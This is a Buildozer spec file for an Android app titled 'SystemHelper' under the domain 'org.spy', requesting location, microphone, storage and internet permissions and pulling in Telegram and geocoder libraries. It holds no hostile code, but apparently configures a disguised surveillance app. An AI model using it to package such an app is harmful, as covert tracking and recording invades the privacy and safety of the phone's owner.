[app]
title = SystemHelper
package.name = systemhelper
package.domain = org.spy
source.dir = .
source.include_exts = py,png,jpg,kv,atlas,json
version = 1.0
requirements = python3,kivy,requests,certifi,urllib3,idna,charset-normalizer,pydantic,h11,httpcore,httpx,telegram,geocoder,pyjnius
orientation = portrait
fullscreen = 0
android.permissions = INTERNET, ACCESS_FINE_LOCATION, READ_EXTERNAL_STORAGE, WRITE_EXTERNAL_STORAGE, RECORD_AUDIO
android.api = 33
android.min_api = 21
android.ndk = 25b
android.sdk = 33

[buildozer]
log_level = 2
warn_on_root = 1
